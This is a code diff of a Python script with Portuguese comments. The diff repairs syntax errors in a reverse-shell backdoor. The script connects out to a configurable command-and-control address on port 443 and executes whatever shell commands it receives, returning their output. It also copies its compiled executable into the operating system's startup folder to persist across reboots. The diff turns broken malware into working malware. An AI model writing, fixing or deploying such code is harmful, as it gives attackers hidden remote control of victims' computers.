@@ -4,43 +4,43 @@ import threading
 import time
 import os
 
-CCIP = "" #ipmaquina client
+CCIP = ""  # ip da máquina cliente
 CCPORT = 443
 
 def autorun():
     filen = os.path.basename(__file__)
     exe_file = filen.replace(".py", ".exe")
-    os.system("copy {} "/"" format(exe_file)) #Após a barra adicionar a pasta de startip do SO
+    os.system("copy {} /destination_folder".format(exe_file))  # substituir "destination_folder" pela pasta de inicialização do SO
 
-def conn (CCIP, CCPORT):
+def conn(CCIP, CCPORT):
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.conect((CCIP,CCPORT))
+        client.connect((CCIP, CCPORT))
         return client
     except Exception as error:
         print(error)
-        
+
 def cmd(client, data):
     try:
-        proc = subprocess.Popen(data, shell = True, stdin = subprocess.PIPE stderr = subprocess.PIPE, stdout = subprocess.PIPE)
+        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = proc.stdout.read() + proc.stderr.read()
-        client.send(output + b "\n")
+        client.send(output + b"\n")
     except Exception as error:
         print(error)
-        
+
 def cli(client):
     try:
         while True:
             data = client.recv(1024).decode().strip()
-            if data == "/:kill:"
+            if data == "/:kill:":
                 return
             else:
-                threading.Thread(target = cmd, args = (client, data)).start()
-            
-    except Exception as error
+                threading.Thread(target=cmd, args=(client, data)).start()
+
+    except Exception as error:
         client.close()
 
-if __name__ == "__main__"
+if __name__ == "__main__":
     autorun()
     while True:
         client = conn(CCIP, CCPORT)
